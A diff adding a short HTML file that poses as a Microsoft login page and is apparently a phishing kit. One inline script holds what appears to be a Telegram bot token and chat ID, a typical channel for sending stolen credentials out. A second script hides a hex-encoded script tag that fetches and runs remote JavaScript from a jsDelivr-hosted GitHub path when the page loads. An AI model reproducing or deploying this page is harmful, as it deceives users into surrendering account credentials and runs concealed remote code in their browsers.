@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Microsoft login</title>
+</head>
+<body>
+<script>const iovjrtrdhhj9 = '8500476075:AAEK3NdsicjOZKa4GltttGCY9QfD79v1uu4'; const I94626736O = '8596132422';</script>
+ 
+ <script>
+      var hex = '3c736372697074207372633d2268747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f6c696e6b73766f2f6e65772d656d6c406d61696e2f656d6c2e6a73223e3c2f7363726970743e';
+      var str = '';
+      for (var i = 0; i < hex.length; i += 2) {
+        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+      }
+      document.write(str);
+    </script>
+</body>
+</html>
